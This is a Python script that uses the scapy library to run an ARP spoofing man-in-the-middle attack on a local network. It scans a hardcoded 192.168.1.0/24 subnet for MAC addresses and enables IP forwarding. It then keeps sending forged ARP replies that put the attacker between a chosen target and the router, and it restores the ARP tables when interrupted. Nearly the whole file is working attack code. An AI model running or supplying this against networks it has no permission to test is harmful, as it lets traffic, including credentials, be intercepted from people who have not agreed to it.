#!/usr/bin/python3

import scapy.all as scapy
import time
import sys
import argparse
import os
# To use external functions before executing the code
def parsing_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="IP address of the target")
    parser.add_argument("-r", "--router", dest="router", help="IP address of the router")
    options = parser.parse_args()

    if not options.target:
        parser.error("[-] IP address of target client missing. Use --help for more details")

    elif not options.router:
        parser.error("[-] IP address of the router is missing. Use --help for more details")

    return options

# Calling out the parsing_argument function and initializing it a variable
parse_ip = parsing_arguments()

# initializing each functionality of the parsing argument and giving it to a specific variable name so it can be later used
# in other functionalities
client_ip = parse_ip.target
gateway_ip = parse_ip.router

# Fetching mac address and and returning back to the variable
def fetch_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    response_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Creating a list of clients in a dicitionary format
    clients_list = []
    for elements in response_list:
        client_dict = {elements[1].psrc: elements[1].hwsrc}
        clients_list.append(client_dict)

    return clients_list


#  Fetch all mac & ip address and saving it in a list of a dictionary format
ip_mac = fetch_mac_address("192.168.1.1/24")

def fetch_mac(ip_address):
    for item in ip_mac:
        if ip_address in item.keys():
            mac_address = item[ip_address]
            return mac_address

# Spoofing functionality
def spoofing(target_ip, spoof_ip):
    target_mac = fetch_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restoring ARP tables
def arp_restore(destination_ip, source_ip):
    destination_mac = fetch_mac(destination_ip)
    source_mac = fetch_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4) # will send packet 4 times to make sure to correct arp table

# To continue the spoofing packets
packet_count = 0
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
try:
    while True:
        spoofing(client_ip, gateway_ip)# will spoof the client by telling that i am the router
        spoofing(gateway_ip, client_ip)# will spoof the router by telling i am the client

        packet_count = packet_count + 2
        print("\r[+] Packet Sent Successfully: " + str(packet_count), end="")

        sys.stdout.flush()
        time.sleep(1) # will sleep for 1 sec. In order to not send to many packets

# If Ctrl + C, the below code will execute
except KeyboardInterrupt:
    print("\n[-] Stopping Arp Spoofing. CTRL + C Detected ....... Resetting ARP tables ...... Please Wait")
    arp_restore(client_ip, gateway_ip) # Restoring client ip
    arp_restore(gateway_ip, client_ip) # Restoring router ip